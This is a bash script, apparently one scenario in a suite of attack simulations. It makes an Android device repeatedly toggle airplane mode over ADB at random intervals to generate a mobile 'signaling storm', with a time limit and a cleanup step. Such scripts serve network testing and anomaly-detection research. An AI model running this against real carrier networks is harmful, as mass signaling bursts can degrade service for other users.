#!/bin/bash
# S4 — Signaling Storm: ADB airplane-mode toggle with randomized interval.
# Usage: signaling_storm.sh <adb_device_id> [duration_seconds]

set -euo pipefail
source "$(dirname "$0")/../attack_config.env"

DEV="${1:?Usage: signaling_storm.sh <adb_device_id> [duration_s]}"
DURATION="${2:-90}"

cleanup() {
    echo "[SIGNALING] Restoring airplane mode OFF on $DEV..."
    adb -s "$DEV" shell cmd connectivity airplane-mode disable 2>/dev/null || true
    echo "[SIGNALING] Cleanup done."
}
trap cleanup EXIT INT TERM

echo "[SIGNALING] Starting on $DEV for ${DURATION}s"

END_TIME=$(( $(date +%s) + DURATION ))
CYCLE=1
while [ $(date +%s) -lt $END_TIME ]; do
    INTERVAL=$(( RANDOM % 6 + 5 ))
    echo "[SIGNALING] Cycle $CYCLE: airplane ON..."
    adb -s "$DEV" shell cmd connectivity airplane-mode enable
    sleep 2
    echo "[SIGNALING] Cycle $CYCLE: airplane OFF (wait ${INTERVAL}s)"
    adb -s "$DEV" shell cmd connectivity airplane-mode disable
    sleep "$INTERVAL"
    CYCLE=$(( CYCLE + 1 ))
done
echo "[SIGNALING] Time elapsed. Exiting."
